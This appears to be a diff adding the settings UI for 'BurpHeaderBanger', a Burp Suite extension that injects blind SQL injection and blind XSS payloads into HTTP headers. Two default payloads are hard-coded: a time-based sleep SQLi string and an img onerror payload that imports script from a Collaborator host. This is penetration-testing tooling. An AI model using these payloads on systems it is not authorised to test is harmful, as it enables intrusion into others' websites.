@@ -1,0 +1,523 @@
+package slicingmelon.burpheaderbanger;
+
+import burp.api.montoya.MontoyaApi;
+import burp.api.montoya.collaborator.CollaboratorPayload;
+
+import javax.swing.*;
+import java.awt.*;
+import java.awt.event.ItemEvent;
+import java.util.List;
+
+public class HeaderBangerTab {
+    private final BurpHeaderBanger extension;
+    private final MontoyaApi api;
+    
+    private JTabbedPane tabbedPane;
+    private JCheckBox activeCheckBox;
+    private JCheckBox onlyInScopeCheckBox;
+    private JCheckBox addOnlyIfNotExistsCheckBox;
+    private JButton sqliButton;
+    private JButton xssButton;
+    private DefaultListModel<String> headersListModel;
+    private DefaultListModel<String> sensitiveHeadersListModel;
+    private DefaultListModel<String> hostsListModel;
+    private DefaultListModel<String> extraHeadersListModel;
+    private JList<String> headersList;
+    private JList<String> sensitiveHeadersList;
+    private JList<String> hostsList;
+    private JList<String> extraHeadersList;
+    private JTextField newHeaderField;
+    private JTextField newSensitiveHeaderField;
+    private JTextField newHostField;
+    private JTextField newExtraHeaderField;
+    private JTextField sqliPayloadField;
+    private JTextField bxssPayloadField;
+
+    public HeaderBangerTab(BurpHeaderBanger extension, MontoyaApi api) {
+        this.extension = extension;
+        this.api = api;
+        createUI();
+    }
+
+    public JTabbedPane getTabbedPane() {
+        return tabbedPane;
+    }
+
+    private void createUI() {
+        tabbedPane = new JTabbedPane();
+        
+        // Create tabs
+        JPanel attackModePanel = createAttackModePanel();
+        JPanel headersPanel = createHeadersAndPayloadsPanel();
+        JPanel excludedHostsPanel = createExcludedHostsPanel();
+        
+        tabbedPane.addTab("Attack Mode", attackModePanel);
+        tabbedPane.addTab("Headers and Payloads", headersPanel);
+        tabbedPane.addTab("Excluded Hosts", excludedHostsPanel);
+    }
+
+    private JPanel createAttackModePanel() {
+        JPanel panel = new JPanel(new BorderLayout());
+        
+        // Active panel
+        JPanel activePanel = new JPanel(new FlowLayout(FlowLayout.LEFT));
+        activeCheckBox = new JCheckBox("Active", extension.isExtensionActive());
+        activeCheckBox.addItemListener(e -> {
+            extension.setExtensionActive(e.getStateChange() == ItemEvent.SELECTED);
+            extension.saveSettings();
+            api.logging().logToOutput("Extension is now " + (extension.isExtensionActive() ? "active" : "inactive"));
+        });
+        activePanel.add(activeCheckBox);
+        
+        onlyInScopeCheckBox = new JCheckBox("Only in scope items", extension.isOnlyInScopeItems());
+        onlyInScopeCheckBox.addItemListener(e -> {
+            extension.setOnlyInScopeItems(e.getStateChange() == ItemEvent.SELECTED);
+            extension.saveSettings();
+            api.logging().logToOutput("Only in scope items is now " + (extension.isOnlyInScopeItems() ? "enabled" : "disabled"));
+        });
+        activePanel.add(onlyInScopeCheckBox);
+        
+        // Attack mode panel
+        JPanel attackModePanel = new JPanel(new FlowLayout(FlowLayout.LEFT));
+        attackModePanel.add(new JLabel("Select the attack mode:"));
+        
+        sqliButton = new JButton("Blind SQL Injection");
+        sqliButton.addActionListener(e -> setAttackMode(1));
+        
+        xssButton = new JButton("Blind XSS");
+        xssButton.addActionListener(e -> setAttackMode(2));
+        
+        attackModePanel.add(sqliButton);
+        attackModePanel.add(xssButton);
+        
+        panel.add(activePanel, BorderLayout.NORTH);
+        panel.add(attackModePanel, BorderLayout.CENTER);
+        
+        updateAttackModeButtons();
+        
+        return panel;
+    }
+
+    private void setAttackMode(int mode) {
+        extension.setAttackMode(mode);
+        extension.updateInjectedHeaders();
+        updateAttackModeButtons();
+        extension.saveSettings();
+        api.logging().logToOutput("Attack mode set to " + (mode == 1 ? "Blind SQL Injection" : "Blind XSS"));
+    }
+
+    private void updateAttackModeButtons() {
+        if (extension.getAttackMode() == 1) {
+            sqliButton.setBackground(Color.GREEN);
+            xssButton.setBackground(null);
+        } else {
+            sqliButton.setBackground(null);
+            xssButton.setBackground(Color.GREEN);
+        }
+    }
+
+    private JPanel createHeadersAndPayloadsPanel() {
+        JPanel panel = new JPanel(new BorderLayout());
+        
+        // Top panel with checkbox
+        JPanel topPanel = new JPanel(new FlowLayout(FlowLayout.LEFT));
+        addOnlyIfNotExistsCheckBox = new JCheckBox("Add extra headers only if they don't exist (unchecked = overwrite existing)", !extension.isOverwriteExtraHeaders());
+        addOnlyIfNotExistsCheckBox.addItemListener(e -> {
+            extension.setOverwriteExtraHeaders(e.getStateChange() != ItemEvent.SELECTED);
+            extension.saveSettings();
+            api.logging().logToOutput("Extra headers mode: " + (extension.isOverwriteExtraHeaders() ? "overwrite existing" : "add only if not exists"));
+        });
+        topPanel.add(addOnlyIfNotExistsCheckBox);
+        
+        // Headers and payloads grid
+        JPanel gridPanel = new JPanel(new GridLayout(1, 5));
+        
+        // Headers panel
+        JPanel headersPanel = createHeadersPanel();
+        gridPanel.add(headersPanel);
+        
+        // Sensitive headers panel
+        JPanel sensitiveHeadersPanel = createSensitiveHeadersPanel();
+        gridPanel.add(sensitiveHeadersPanel);
+        
+        // SQLi payload panel
+        JPanel sqliPanel = createSqliPayloadPanel();
+        gridPanel.add(sqliPanel);
+        
+        // XSS payload panel
+        JPanel xssPanel = createXssPayloadPanel();
+        gridPanel.add(xssPanel);
+        
+        // Extra headers panel (last)
+        JPanel extraHeadersPanel = createExtraHeadersPanel();
+        gridPanel.add(extraHeadersPanel);
+        
+        panel.add(topPanel, BorderLayout.NORTH);
+        panel.add(gridPanel, BorderLayout.CENTER);
+        
+        return panel;
+    }
+
+    private JPanel createHeadersPanel() {
+        JPanel panel = new JPanel();
+        panel.setLayout(new BoxLayout(panel, BoxLayout.Y_AXIS));
+        
+        panel.add(new JLabel("Headers:"));
+        
+        headersListModel = new DefaultListModel<>();
+        extension.getHeaders().forEach(headersListModel::addElement);
+        headersList = new JList<>(headersListModel);
+        panel.add(new JScrollPane(headersList));
+        
+        // Controls
+        JPanel controlsPanel = new JPanel(new FlowLayout());
+        newHeaderField = new JTextField(15);
+        controlsPanel.add(newHeaderField);
+        
+        JButton addButton = new JButton("Add");
+        addButton.addActionListener(e -> addHeader());
+        controlsPanel.add(addButton);
+        
+        JButton deleteButton = new JButton("Delete");
+        deleteButton.addActionListener(e -> deleteHeader());
+        controlsPanel.add(deleteButton);
+        
+        JButton clearButton = new JButton("Clear");
+        clearButton.addActionListener(e -> clearHeaders());
+        controlsPanel.add(clearButton);
+        
+        JButton defaultButton = new JButton("Default");
+        defaultButton.addActionListener(e -> setDefaultHeaders());
+        controlsPanel.add(defaultButton);
+        
+        panel.add(controlsPanel);
+        
+        return panel;
+    }
+
+    private JPanel createSensitiveHeadersPanel() {
+        JPanel panel = new JPanel();
+        panel.setLayout(new BoxLayout(panel, BoxLayout.Y_AXIS));
+        
+        panel.add(new JLabel("Sensitive Headers:"));
+        
+        sensitiveHeadersListModel = new DefaultListModel<>();
+        extension.getSensitiveHeaders().forEach(sensitiveHeadersListModel::addElement);
+        sensitiveHeadersList = new JList<>(sensitiveHeadersListModel);
+        panel.add(new JScrollPane(sensitiveHeadersList));
+        
+        // Controls
+        JPanel controlsPanel = new JPanel(new FlowLayout());
+        newSensitiveHeaderField = new JTextField(15);
+        controlsPanel.add(newSensitiveHeaderField);
+        
+        JButton addButton = new JButton("Add");
+        addButton.addActionListener(e -> addSensitiveHeader());
+        controlsPanel.add(addButton);
+        
+        JButton deleteButton = new JButton("Delete");
+        deleteButton.addActionListener(e -> deleteSensitiveHeader());
+        controlsPanel.add(deleteButton);
+        
+        JButton clearButton = new JButton("Clear");
+        clearButton.addActionListener(e -> clearSensitiveHeaders());
+        controlsPanel.add(clearButton);
+        
+        JButton defaultButton = new JButton("Default");
+        defaultButton.addActionListener(e -> setDefaultSensitiveHeaders());
+        controlsPanel.add(defaultButton);
+        
+        panel.add(controlsPanel);
+        
+        return panel;
+    }
+
+    private JPanel createSqliPayloadPanel() {
+        JPanel panel = new JPanel();
+        panel.setLayout(new BoxLayout(panel, BoxLayout.Y_AXIS));
+        
+        panel.add(new JLabel("SQL Injection Payload:"));
+        
+        sqliPayloadField = new JTextField(extension.getSqliPayload());
+        panel.add(sqliPayloadField);
+        
+        JPanel controlsPanel = new JPanel(new FlowLayout());
+        JButton saveButton = new JButton("Save");
+        saveButton.addActionListener(e -> saveSqliPayload());
+        controlsPanel.add(saveButton);
+        
+        JButton defaultButton = new JButton("Default");
+        defaultButton.addActionListener(e -> setDefaultSqliPayload());
+        controlsPanel.add(defaultButton);
+        
+        panel.add(controlsPanel);
+        
+        return panel;
+    }
+
+    private JPanel createXssPayloadPanel() {
+        JPanel panel = new JPanel();
+        panel.setLayout(new BoxLayout(panel, BoxLayout.Y_AXIS));
+        
+        panel.add(new JLabel("Blind XSS Payload:"));
+        
+        bxssPayloadField = new JTextField(extension.getBxssPayload());
+        panel.add(bxssPayloadField);
+        
+        JPanel controlsPanel = new JPanel(new FlowLayout());
+        JButton saveButton = new JButton("Save");
+        saveButton.addActionListener(e -> saveBxssPayload());
+        controlsPanel.add(saveButton);
+        
+        JButton defaultButton = new JButton("Default");
+        defaultButton.addActionListener(e -> setDefaultBxssPayload());
+        controlsPanel.add(defaultButton);
+        
+        panel.add(controlsPanel);
+        
+        return panel;
+    }
+
+    private JPanel createExtraHeadersPanel() {
+        JPanel panel = new JPanel();
+        panel.setLayout(new BoxLayout(panel, BoxLayout.Y_AXIS));
+        
+        panel.add(new JLabel("Extra Headers:"));
+        
+        extraHeadersListModel = new DefaultListModel<>();
+        extension.getExtraHeaders().forEach(extraHeadersListModel::addElement);
+        extraHeadersList = new JList<>(extraHeadersListModel);
+        panel.add(new JScrollPane(extraHeadersList));
+        
+        // Controls
+        JPanel controlsPanel = new JPanel(new FlowLayout());
+        newExtraHeaderField = new JTextField(15);
+        controlsPanel.add(newExtraHeaderField);
+        
+        JButton addButton = new JButton("Add");
+        addButton.addActionListener(e -> addExtraHeader());
+        controlsPanel.add(addButton);
+        
+        JButton deleteButton = new JButton("Delete");
+        deleteButton.addActionListener(e -> deleteExtraHeader());
+        controlsPanel.add(deleteButton);
+        
+        JButton clearButton = new JButton("Clear");
+        clearButton.addActionListener(e -> clearExtraHeaders());
+        controlsPanel.add(clearButton);
+        
+        panel.add(controlsPanel);
+        
+        return panel;
+    }
+
+    private JPanel createExcludedHostsPanel() {
+        JPanel panel = new JPanel(new BorderLayout());
+        
+        hostsListModel = new DefaultListModel<>();
+        extension.getSkipHosts().forEach(hostsListModel::addElement);
+        hostsList = new JList<>(hostsListModel);
+        panel.add(new JScrollPane(hostsList), BorderLayout.CENTER);
+        
+        JPanel controlsPanel = new JPanel();
+        newHostField = new JTextField(20);
+        controlsPanel.add(newHostField);
+        
+        JButton addButton = new JButton("Add");
+        addButton.addActionListener(e -> addHost());
+        controlsPanel.add(addButton);
+        
+        JButton deleteButton = new JButton("Delete");
+        deleteButton.addActionListener(e -> deleteHost());
+        controlsPanel.add(deleteButton);
+        
+        JButton clearButton = new JButton("Clear");
+        clearButton.addActionListener(e -> clearHosts());
+        controlsPanel.add(clearButton);
+        
+        panel.add(controlsPanel, BorderLayout.SOUTH);
+        
+        return panel;
+    }
+
+    // Header management methods
+    private void addHeader() {
+        String newHeader = newHeaderField.getText().trim();
+        if (!newHeader.isEmpty() && !extension.getHeaders().contains(newHeader)) {
+            extension.getHeaders().add(newHeader);
+            headersListModel.addElement(newHeader);
+            newHeaderField.setText("");
+            extension.updateInjectedHeaders();
+            extension.saveSettings();
+        } else {
+            JOptionPane.showMessageDialog(null, "Header already in list or empty");
+        }
+    }
+
+    private void deleteHeader() {
+        String selectedHeader = headersList.getSelectedValue();
+        if (selectedHeader != null) {
+            extension.getHeaders().remove(selectedHeader);
+            headersListModel.removeElement(selectedHeader);
+            extension.updateInjectedHeaders();
+            extension.saveSettings();
+        }
+    }
+
+    private void clearHeaders() {
+        extension.getHeaders().clear();
+        headersListModel.clear();
+        extension.updateInjectedHeaders();
+        extension.saveSettings();
+    }
+
+    private void setDefaultHeaders() {
+        extension.getHeaders().clear();
+        headersListModel.clear();
+        extension.getHeaders().addAll(extension.getDefaultHeaders());
+        extension.getHeaders().forEach(headersListModel::addElement);
+        extension.updateInjectedHeaders();
+        extension.saveSettings();
+    }
+
+    // Sensitive header management methods
+    private void addSensitiveHeader() {
+        String newHeader = newSensitiveHeaderField.getText().trim();
+        if (!newHeader.isEmpty() && !extension.getSensitiveHeaders().contains(newHeader)) {
+            extension.getSensitiveHeaders().add(newHeader);
+            sensitiveHeadersListModel.addElement(newHeader);
+            newSensitiveHeaderField.setText("");
+            extension.updateInjectedHeaders();
+            extension.saveSettings();
+        } else {
+            JOptionPane.showMessageDialog(null, "Sensitive header already in list or empty");
+        }
+    }
+
+    private void deleteSensitiveHeader() {
+        String selectedHeader = sensitiveHeadersList.getSelectedValue();
+        if (selectedHeader != null) {
+            extension.getSensitiveHeaders().remove(selectedHeader);
+            sensitiveHeadersListModel.removeElement(selectedHeader);
+            extension.updateInjectedHeaders();
+            extension.saveSettings();
+        }
+    }
+
+    private void clearSensitiveHeaders() {
+        extension.getSensitiveHeaders().clear();
+        sensitiveHeadersListModel.clear();
+        extension.updateInjectedHeaders();
+        extension.saveSettings();
+    }
+
+    private void setDefaultSensitiveHeaders() {
+        extension.getSensitiveHeaders().clear();
+        sensitiveHeadersListModel.clear();
+        extension.getSensitiveHeaders().addAll(extension.getDefaultSensitiveHeaders());
+        extension.getSensitiveHeaders().forEach(sensitiveHeadersListModel::addElement);
+        extension.updateInjectedHeaders();
+        extension.saveSettings();
+    }
+
+    // Extra header management methods
+    private void addExtraHeader() {
+        String newHeader = newExtraHeaderField.getText().trim();
+        if (!newHeader.isEmpty() && !extension.getExtraHeaders().contains(newHeader)) {
+            extension.getExtraHeaders().add(newHeader);
+            extraHeadersListModel.addElement(newHeader);
+            newExtraHeaderField.setText("");
+            extension.updateInjectedHeaders();
+            extension.saveSettings();
+        } else {
+            JOptionPane.showMessageDialog(null, "Extra header already in list or empty");
+        }
+    }
+
+    private void deleteExtraHeader() {
+        String selectedHeader = extraHeadersList.getSelectedValue();
+        if (selectedHeader != null) {
+            extension.getExtraHeaders().remove(selectedHeader);
+            extraHeadersListModel.removeElement(selectedHeader);
+            extension.updateInjectedHeaders();
+            extension.saveSettings();
+        }
+    }
+
+    private void clearExtraHeaders() {
+        extension.getExtraHeaders().clear();
+        extraHeadersListModel.clear();
+        extension.updateInjectedHeaders();
+        extension.saveSettings();
+    }
+
+    // Payload management methods
+    private void saveSqliPayload() {
+        String newPayload = sqliPayloadField.getText().trim();
+        if (!newPayload.isEmpty()) {
+            extension.setSqliPayload(newPayload);
+            extension.extractSqliSleepTime();
+            extension.updateInjectedHeaders();
+            extension.saveSettings();
+        } else {
+            JOptionPane.showMessageDialog(null, "The SQL Injection payload cannot be empty.");
+        }
+    }
+
+    private void setDefaultSqliPayload() {
+        String defaultPayload = "1'XOR(if(now()=sysdate(),sleep(17),0))OR'Z";
+        extension.setSqliPayload(defaultPayload);
+        sqliPayloadField.setText(defaultPayload);
+        extension.extractSqliSleepTime();
+        extension.updateInjectedHeaders();
+        extension.saveSettings();
+    }
+
+    private void saveBxssPayload() {
+        String newPayload = bxssPayloadField.getText().trim();
+        if (!newPayload.isEmpty()) {
+            extension.setBxssPayload(newPayload);
+            extension.updateInjectedHeaders();
+            extension.saveSettings();
+        } else {
+            JOptionPane.showMessageDialog(null, "The Blind XSS payload cannot be empty.");
+        }
+    }
+
+    private void setDefaultBxssPayload() {
+        CollaboratorPayload payload = extension.getCollaboratorClient().generatePayload();
+        String defaultPayload = "\"><img/src/onerror=import('//" + payload.toString() + "')>";
+        extension.setBxssPayload(defaultPayload);
+        bxssPayloadField.setText(defaultPayload);
+        extension.updateInjectedHeaders();
+        extension.saveSettings();
+    }
+
+    // Host management methods
+    private void addHost() {
+        String newHost = newHostField.getText().trim();
+        if (!newHost.isEmpty() && !extension.getSkipHosts().contains(newHost)) {
+            extension.getSkipHosts().add(newHost);
+            hostsListModel.addElement(newHost);
+            newHostField.setText("");
+            extension.saveSettings();
+        } else {
+            JOptionPane.showMessageDialog(null, "Host already in list or empty");
+        }
+    }
+
+    private void deleteHost() {
+        String selectedHost = hostsList.getSelectedValue();
+        if (selectedHost != null) {
+            extension.getSkipHosts().remove(selectedHost);
+            hostsListModel.removeElement(selectedHost);
+            extension.saveSettings();
+        }
+    }
+
+    private void clearHosts() {
+        extension.getSkipHosts().clear();
+        hostsListModel.clear();
+        extension.saveSettings();
+    }
+} 
